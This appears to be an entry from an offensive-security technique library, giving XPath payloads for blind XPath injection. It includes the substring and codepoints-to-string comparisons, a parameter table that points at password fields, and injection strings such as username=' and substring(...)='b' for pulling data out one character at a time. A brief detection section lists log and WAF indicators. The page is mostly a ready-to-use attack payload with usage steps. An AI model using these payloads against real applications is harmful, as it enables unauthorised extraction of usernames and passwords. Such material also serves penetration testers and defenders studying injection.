---
id: eaa8af0e-908b-49a5-93a3-ce1d69c34b64
type: code
name: XPath-Character-Extraction-Using-Substring
language: xpath
verified: true
created_at: '2023-04-06T03:56:41.407651+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Web
tags:
  - xpath-injection
  - blind-exploitation
  - data-extraction
validated: true
---

# XPath-Character-Extraction-Using-Substring

## Code

```xpath
substring(//user[userid=5]/username,2,1)=CHAR_HERE
substring(//user[userid=5]/username,2,1)=codepoints-to-string(INT_ORD_CHAR_HERE)
```

## Description

This XPath snippet extracts a specific character from a string element (e.g., username) at a given position and compares it to a test value using boolean conditions. It supports direct character matching or Unicode codepoint conversion, enabling blind extraction of data one character at a time in injection attacks.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| //user[userid=5]/username | The XPath path to the target string element | //user[userid=1]/password |
| 2 | Starting position (1-indexed) for substring extraction | 1 |
| 1 | Length of substring to extract (typically 1 for single characters) | 1 |
| CHAR_HERE | Single character to compare against | 'a' |
| INT_ORD_CHAR_HERE | Integer Unicode codepoint of the character to compare | 97 (for 'a') |

## Usage

Inject into a vulnerable parameter, e.g., username=' and substring(//user[userid=5]/username,2,1)='b' -- or username=' and substring(//user[userid=5]/username,2,1)=codepoints-to-string(98) --. Test against possible characters (a-z, 0-9) until a true response confirms the match. Repeat for each position after determining length. Used in blind data exfiltration within procedures like [[procedures/Perform-Blind-XPath-Injection-for-Data-Extraction]].

## Detection

- Logs indicating substring or codepoints-to-string functions in crafted inputs.
- WAF rules triggering on XPath extraction functions like substring in payloads.
- Behavioral anomalies, such as requests testing sequential character positions or Unicode conversions.
